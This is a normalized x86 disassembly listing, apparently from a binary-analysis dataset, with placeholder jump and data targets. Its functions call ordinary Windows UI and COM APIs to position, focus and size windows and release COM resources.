movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
add eax edi
push eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
add eax [ ebp + 0x8 ]
push eax
push edi
push [ ebp + 0x8 ]
push ebx
call esi
mov eax [ ebp - 0x4 ]
push ebx
push ebx
mov eax [ eax + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_428ee8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi ecx
test bl 0x80
je r-xdata
mov eax ebx
and eax 0x3
cmp al 0x3
je r-xdata
mov eax [ esi ]
push 0x0
call [ eax + 0xa0 ]
test bl 0x40
je r-xdata
test bl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
and bl 0x3f
or ebx 0x3
test eax eax
je r-xdata
mov eax [ esi ]
push 0x5
mov ecx esi
call [ eax + 0xa0 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ esi + 0x2c ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x30 ]
jmp r-xdata
push ebx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ esi + 0x20 ]
call [ SetWindowPos@IAT ]
pop esi
pop ebx
leave
retn 0x18
mov eax [ eax + 0x1c ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x38 ]
sub eax [ esi + 0x2c ]
sub ecx [ esi + 0x30 ]
jmp r-xdata
test bl 0x1
mov [ ebp + 0x1c ] eax
je r-xdata
push edi
mov edi ebx
not edi
shr edi 0x3
and edi 0x1
mov edx [ esi ]
push edi
push ecx
push eax
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp - 0x4 ]
call [ edx + 0x98 ]
pop edi
sub_428f9d
push esi
mov esi ecx
push edi
push [ esi + 0x20 ]
call [ IsWindowVisible@IAT ]
mov edi eax
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push 0xfffffffd
pop eax
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x3
jle r-xdata
mov edx [ esi ]
push 0x0
push eax
mov ecx esi
call [ edx + 0x54 ]
mov eax edi
pop edi
pop esi
retn 0x4
cmp eax 0x5
jg r-xdata
sub_428fdc
mov eax sub_464680
call sub_42dc88
sub esp 0xc
mov eax [ ecx ]
push ebx
and [ ebp - 0x4 ] 0x0
push esi
push edi
lea edx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] esp
push edx
push 0xb
push 0xfffffdfe
mov [ ebp - 0x14 ] 0x1
call [ eax + 0x64 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_42902a
mov eax sub_46468c
call sub_42dc88
sub esp 0xc
push ebx
push esi
and [ ebp - 0x4 ] 0x0
mov esi ecx
push edi
lea ecx [ ebp - 0x14 ]
mov eax [ esi ]
mov [ ebp - 0x10 ] esp
push ecx
mov edi 0xfffffdfe
push 0xb
push edi
mov ecx esi
call [ eax + 0x64 ]
push [ ebp + 0x8 ]
mov eax [ esi ]
push 0xb
push edi
push esi
call [ eax + 0x68 ]
add esp 0x10
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ ebp - 0x14 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
sete al
pop ebx
leave
retn 0x4
sub_429093
push esi
mov esi ecx
test [ esi + 0x71 ] 0x40
je r-xdata
push edi
call [ GetFocus@IAT ]
push eax
call sub_43e7b3
mov edi eax
mov eax [ esi ]
push 0x0
push 0xfffffffc
mov ecx esi
call [ eax + 0x54 ]
mov eax edi
pop edi
pop esi
retn
push [ esi + 0x20 ]
call [ SetFocus@IAT ]
push eax
call sub_43e7b3
pop esi
retn
sub_4290cc
mov eax sub_4646a2
call sub_42dc88
push ecx
push esi
mov esi ecx
cmp [ esi + 0x88 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x5c
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push esi
call sub_429918
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx eax
mov [ esi + 0x88 ] eax
call sub_429ca1
sub_429120
push esi
mov esi ecx
push edi
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
mov ecx [ eax + 0x88 ]
push 0x0
push esi
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax [ esi + 0x90 ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0xc ]
and [ esi + 0x90 ] 0x0
pop edi
pop esi
retn 0x10
mov ecx [ edi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov eax [ edi + 0x38 ]
push [ esp + 0x14 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0x10 ]
mov [ esi + 0x94 ] eax
lea ecx [ esi + 0x9c ]
movzx eax [ esp + 0x14 ]
mov [ esi + 0x98 ] eax
call sub_4422d1
mov eax [ esi + 0x90 ]
push 0x1
push esi
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov esi [ esi + 0x90 ]
test esi esi
je r-xdata
mov ecx [ esi + 0x88 ]
mov eax [ ecx ]
call [ eax + 0xc ]
sub_4291c2
mov eax sub_4646b6
call sub_42dc88
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov esi ecx
cmp edi ebx
je r-xdata
mov edi [ esi + 0x8c ]
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov ecx edi
call sub_42bfe8
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
je r-xdata
push 0x1c
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ edi + 0x8 ] eax
jne r-xdata
xor eax eax
push ebx
push [ ebp + 0x8 ]
push [ esi + 0x8c ]
call sub_42bfa5
jmp r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov eax [ eax + 0x38 ]
cmp eax [ edi + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov [ esi + 0x8c ] eax
mov ecx [ edi + 0x38 ]
mov [ eax + 0xc ] ecx
mov eax [ esi + 0x8c ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
mov eax [ esi + 0x8c ]
mov ecx [ eax + 0xc ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov esi [ esi + 0x8c ]
push 0x1
push esi
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
jmp r-xdata
mov [ esi + 0x8c ] ebx
mov [ eax + 0x18 ] ebx
jmp r-xdata
test ebx ebx
mov edi ebx
jne r-xdata
call sub_42bfe8
mov [ ebp - 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ eax + 0x88 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push edi
call sub_441eb2
pop ecx
mov eax [ ecx ]
push 0x0
push edi
call [ eax + 0x4 ]
sub_42938d
mov eax [ esp + 0x4 ]
mov eax [ eax - 0xa0 ]
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
neg eax
sbb eax eax
and eax 0x7fffbffb
add eax 0x80004005
retn 0x8
mov eax [ eax + 0x1c ]
sub_4293cf
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
mov ecx [ edi - 0xa0 ]
lea esi [ edi - 0xa0 ]
push r--data
call sub_456865
test eax eax
jge r-xdata
and [ eax ] 0x0
mov eax [ esi ]
add edi 0xffffff70
push edi
push [ ebp + 0x14 ]
mov esi [ eax + 0x1c ]
call [ CopyRect@IAT ]
push [ ebp + 0x18 ]
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp + 0x1c ]
and [ eax + 0x4 ] 0x0
test esi esi
je r-xdata
mov eax 0x80004005
jmp r-xdata
and [ eax + 0xc ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax + 0x8 ] esi
xor eax eax
mov esi [ esi + 0x1c ]
pop edi
pop esi
pop ebp
retn 0x18
sub_42948a
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push edi
push eax
mov eax [ ebx - 0xa0 ]
mov eax [ eax + 0x1c ]
push [ eax + 0x1c ]
call [ GetClientRect@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call [ CopyRect@IAT ]
lea eax [ ebx - 0x90 ]
lea esi [ ebp - 0x10 ]
mov edi eax
mov ebx [ ebx - 0x6c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
mov ecx [ ebx ]
push edx
push eax
push ebx
call [ ecx + 0x1c ]
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_429530
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push [ eax - 0xa0 ]
xor esi esi
mov [ ebp - 0x4 ] esi
call [ GetDC@IAT ]
mov edi eax
push 0x3
push edi
call [ SetMapMode@IAT ]
mov bl [ ebp + 0x14 ]
mov [ ebp - 0x14 ] esi
test bl 0x4
mov [ ebp - 0x10 ] esi
je r-xdata
test bl 0x8
je r-xdata
mov eax [ ebp + 0xc ]
push 0x2
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov [ ebp - 0xc ] ecx
call [ LPtoDP@IAT ]
test bl 0x2
je r-xdata
mov [ ebp - 0x4 ] 0x80070057
mov esi [ ebp + 0x10 ]
fld [ esi ]
call sub_42d9f4
fld [ esi + 0x4 ]
mov [ ebp - 0xc ] eax
call sub_42d9f4
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push 0x2
push eax
push edi
call [ DPtoLP@IAT ]
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
sub eax [ ebp - 0x14 ]
sub ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp + 0x10 ]
fild [ ebp + 0xc ]
mov [ ebp + 0x10 ] ecx
fstp [ eax ]
fild [ ebp + 0x10 ]
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x8 ]
jmp r-xdata
fild [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
fstp [ eax ]
fild [ ebp - 0x8 ]
fstp [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push edi
push [ eax - 0xa0 ]
call [ ReleaseDC@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x10
sub_429679
mov eax [ esp + 0x4 ]
push [ esp + 0x1c ]
add eax 0xffffff3c
push [ esp + 0xc ]
mov ecx [ eax + 0x1c ]
push eax
mov ecx [ ecx + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x94 ]
neg eax
sbb eax eax
and eax 0x7ffdfffd
add eax 0x80020003
retn 0x24
sub_4296aa
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_4296f4
push ebp
mov ebp esp
sub esp 0x38
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0xc8 ]
xor esi esi
cmp [ edi + 0xa0 ] esi
jne r-xdata
xor eax eax
cmp [ edi + 0x88 ] esi
mov ebx [ ebp + 0xc ]
jne r-xdata
cmp [ edi + 0x94 ] ebx
jne r-xdata
lea eax [ ebp - 0x38 ]
mov ecx edi
push eax
mov [ ebp - 0x38 ] 0x2
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
call sub_428989
mov eax [ ebp - 0x20 ]
cmp eax esi
jne r-xdata
lea eax [ edi + 0xa8 ]
push eax
call [ VariantClear@IAT ]
mov eax [ edi + 0x4c ]
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x20
lea eax [ ebp - 0x34 ]
push esi
push eax
call sub_42dc30
push 0x10
lea eax [ ebp - 0x14 ]
push esi
push eax
call sub_42dc30
add esp 0x18
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ edi + 0xa8 ]
mov edx [ eax ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push 0x2
push esi
push r--data
push ebx
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x30 ] esi
mov ebx [ SysFreeString@IAT ]
mov [ ebp + 0xc ] eax
je r-xdata
cmp [ ebp - 0x2c ] esi
je r-xdata
push [ ebp - 0x30 ]
call ebx
cmp [ ebp - 0x28 ] esi
je r-xdata
push [ ebp - 0x2c ]
call ebx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp + 0xc ] esi
jl r-xdata
push [ ebp - 0x28 ]
call ebx
mov [ edi + 0xa4 ] 0x1
sub_42980a
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp [ eax - 0x28 ] esi
lea ecx [ eax - 0xc8 ]
jne r-xdata
xor eax eax
cmp [ ecx + 0x88 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_428989
mov eax [ ebp - 0xc ]
cmp eax esi
jne r-xdata
pop esi
leave
retn 0x8
sub_42985f
push ebp
mov ebp esp
push esi
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_42dcf0
mov esi [ ebp + 0x8 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
push esi
mov [ eax ] esi
mov eax [ esi ]
call [ eax + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi - 0x90 ]
push 0x10
push eax
push [ ebp + 0xc ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_4298c3
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
xor esi esi
lea ecx [ eax - 0xcc ]
mov [ ebp - 0x24 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_428989
cmp [ ebp + 0x20 ] esi
pop esi
je r-xdata
mov eax [ ebp - 0xc ]
leave
retn 0x24
push [ ebp + 0x20 ]
call [ VariantClear@IAT ]
sub_429918
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
xor edi edi
push 0xa
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
call sub_43cdcd
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
retn 0x4
sub_429966
mov eax sub_4646cb
call sub_42dc88
sub esp 0x14
push ebx
push esi
mov esi ecx
mov [ ebp - 0x20 ] esi
mov [ esi ] r--data
xor ebx ebx
cmp [ esi + 0x58 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push edi
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x1c ] ecx
call sub_43ce0c
cmp [ esi + 0x40 ] ebx
je r-xdata
mov eax [ esi + 0x1c ]
push ebx
mov edi [ eax + 0x8 ]
mov ecx [ edi ]
push [ edi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xb8 ]
mov eax [ edi ]
mov [ eax + 0x90 ] ebx
jmp r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
xor edi edi
cmp [ esi + 0x38 ] ebx
jle r-xdata
cmp [ esi + 0x24 ] ebx
je r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
je r-xdata
mov eax ebx
add eax [ esi + 0x40 ]
push eax
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ esi + 0x58 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ esi + 0x14 ] ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ esi + 0x3c ]
call sub_441eb2
push [ esi + 0x40 ]
call sub_441eb2
pop ecx
pop ecx
xor ebx ebx
cmp [ esi + 0x38 ] ebx
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
jle r-xdata
mov ecx [ esi + 0x54 ]
cmp ecx ebx
je r-xdata
push eax
call [ CoTaskMemFree@IAT ]
push [ esi + 0x14 ]
call [ CoTaskMemFree@IAT ]
xor edi edi
mov edi [ esi + 0x54 ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0x50 ]
push [ eax ]
call sub_429b46
mov ecx [ esi + 0x54 ]
call sub_429c67
mov eax [ esi + 0x14 ]
mov ecx [ eax + edi + 0x24 ]
call sub_43ce0c
mov eax [ esi + 0x14 ]
mov ecx [ eax + edi + 0x24 ]
cmp ecx ebx
je r-xdata
mov ecx eax
mov eax [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x90 ] ebx
jmp r-xdata
mov edi [ esi + 0x50 ]
cmp edi ebx
je r-xdata
mov ecx edi
call sub_429c67
push edi
call sub_441eb2
pop ecx
inc [ ebp - 0x14 ]
add edi 0x28
mov eax [ ebp - 0x14 ]
cmp eax [ esi + 0x10 ]
jl r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4c ]
pop edi
cmp eax ebx
je r-xdata
mov ecx edi
call sub_429bcd
push edi
call sub_441eb2
pop ecx
mov eax [ esi + 0x14 ]
mov eax [ eax + edi + 0x24 ]
mov eax [ eax + 0x4 ]
mov esi [ esi + 0x48 ]
cmp esi ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ ebp - 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
call sub_43ce2c
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
sub_429b46
mov eax sub_4646e0
call sub_42dc88
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
cmp [ esi + 0x4 ] ebx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push edi
mov [ ebp - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
mov ecx [ eax ]
push eax
mov [ ebp - 0x4 ] ebx
call [ ecx ]
cmp eax ebx
mov [ ebp - 0x14 ] eax
jl r-xdata
push [ esi ]
mov [ esi + 0x4 ] ebx
call sub_441eb2
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
pop ecx
cmp eax ebx
mov [ esi ] ebx
pop edi
je r-xdata
xor edi edi
cmp [ esi + 0x4 ] ebx
jbe r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov edx [ esi ]
mov eax [ ebp - 0x10 ]
push ebx
push [ edx + edi * 8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
inc edi
cmp edi [ esi + 0x4 ]
jb r-xdata
sub_429bcd
mov eax sub_4646ff
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_429c18
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi ]
or [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
sub_429c18
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
call sub_429c47
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
and [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x4 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_429c47
push esi
push edi
lea esi [ ecx + 0xc ]
xor edi edi
xor eax eax
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
retn
mov eax [ ecx ]
push edi
push edi
push edi
mov ecx [ eax ]
push esi
push 0x1
push eax
call [ ecx + 0x18 ]
mov [ esi ] edi
sub_429c67
push esi
mov esi ecx
push edi
mov edi [ CoTaskMemFree@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call edi
and [ esi + 0x10 ] 0x0
push [ esi + 0x8 ]
call sub_441eb2
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
pop ecx
pop edi
pop esi
retn
push eax
call edi
and [ esi + 0x14 ] 0x0
sub_429ca1
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x24 ]
call sub_43fd7e
mov edi eax
mov [ ebp - 0x8 ] edi
push [ edi + 0x1c ]
call [ IsWindowVisible@IAT ]
neg eax
sbb eax eax
push 0x0
inc eax
pop ebx
mov [ ebp - 0x14 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
lea edi [ esi + 0x48 ]
push edi
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
jl r-xdata
call [ GetDesktopWindow@IAT ]
push eax
call sub_43e7b3
lea ecx [ ebp - 0x34 ]
push ecx
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push [ edi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x28 ]
push ebx
sub eax [ ebp - 0x30 ]
push ebx
push ebx
mov ecx edi
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
cdq
sub eax edx
sar eax 0x1
push eax
call sub_44176f
push 0x1
mov ecx edi
call sub_4417ff
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0xc ]
push edx
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
cmp eax ebx
jl r-xdata
mov eax [ edi ]
lea edi [ esi + 0x4c ]
push edi
push r--data
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc ]
cmp [ edi ] ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jge r-xdata
mov [ ebp - 0x4 ] 0x80004003
mov ecx [ eax ]
lea edi [ esi + 0x8 ]
push edi
push r--data
push eax
call [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
jl r-xdata
mov eax 0x80004005
jmp r-xdata
mov ecx esi
call sub_429eac
cmp [ ebp - 0x14 ] ebx
mov esi eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov edi [ edi ]
lea ecx [ esi + 0xc ]
push ecx
push r--data
mov eax [ edi ]
push edi
call [ eax ]
mov eax esi
mov eax [ ebp - 0x18 ]
push ebx
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_44176f
mov ecx [ ebp - 0x8 ]
push ebx
call sub_4417ff
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push ebx
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_44176f
mov ecx [ ebp - 0x8 ]
push ebx
call sub_4417ff
sub_429e43
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ecx + 0x48 ]
test edx edx
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x50 ]
neg eax
sbb eax eax
and eax edx
leave
retn
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ecx + 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
jl r-xdata
xor eax eax
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_429eac
